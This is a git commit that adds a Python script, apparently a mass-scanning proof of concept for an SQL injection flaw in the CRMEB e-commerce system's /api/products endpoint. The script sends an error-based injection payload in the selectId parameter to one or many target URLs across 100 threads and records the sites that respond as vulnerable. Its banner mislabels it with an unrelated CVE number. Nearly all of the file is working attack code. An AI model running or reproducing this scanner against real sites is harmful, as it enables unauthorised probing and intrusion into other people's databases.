9ba2ccb1c64f489068d152d88e7ba68117c7e62a
秋喜秋 <2071793763@qq.com>
2024-09-18 09:05:20 +0800

    Add files via upload

---
+++ CRMEB 电商系统 apiproducts SQL注入漏洞.py
@@ -0,0 +1,79 @@
+import sys,requests,argparse,re
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+GREEN = '\033[92m'  # 输出颜色
+RESET = '\033[0m'
+
+# 定义程序的横幅
+def banner():
+    test = """
+┌──────────────────────────────────────────────────────────────────────────────┐
+│                                                                              │
+│                         ┌─────────────────────────────────────┐              │
+│                         │               ( •_•)                │              │
+│                         │              / ︻╦╤─                               
+│                         │             | 'CVE-2023-28432'漏洞安全漏洞扫描工具                
+│                         │              \─╤╦═                  │              │
+│                         └─────────────────────────────────────┘              │
+│                                                                              │
+│                  * 🚀🛡️🔐🔍 - 扫描系统的潜在漏洞，保持系统安全！author:QXQ         │
+│                  * 🛠️📈🔍 - 定期使用，修复问题，减少风险！     date:2024-9-13  
+│                  * 🕵️‍♂️💻🔧 - 保障系统稳定，防止攻击！          version:1.0.0 
+│                                                                              │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+"""
+    print(test)
+
+# 主函数，解析命令行参数并调用相应的功能函数
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="CRMEB电商系统apiproducts SQL注入漏洞")
+    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
+    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
+    args = parser.parse_args()
+
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip().replace('\n',''))
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
+
+# 检测漏洞函数，向目标URL发送请求，检查是否存在漏洞
+def poc(target):
+    payload_url = '/api/products?limit=20&priceOrder&salesOrder&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,md5(1436528)))),0x7e),3550)'
+    url = target + payload_url
+    headers = {
+        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15',
+        'Connection':'close',
+        'Accept':'*/*',
+        'Accept-Language':'en',
+        'Accept-Encoding':'gzip',
+    }
+    
+    try:
+        res = requests.get(url=url,headers=headers,timeout=8,verify=False)
+        # expression = '81a9eb3487199f3a2da3e3f6591ffd62'
+        # match = re.findall(expression,res.text)
+        
+        if res.status_code == 200 and "81a9eb3487199f3a2da3e3f6591ffd62" in res.text:
+            print(f"{GREEN}[+]该网站存在SQL注入漏洞，url为{target}\n{RESET}")
+            with open("result.txt","a",encoding="utf-8") as fp:
+                fp.write(target+'\n')
+        else:
+            print(f"[-]该网站不存在SQL注入漏洞")
+
+    except Exception as e:
+        print(f"[*]该网站无法访问")
+
+# 程序入口点
+if __name__ == '__main__':
+    main()
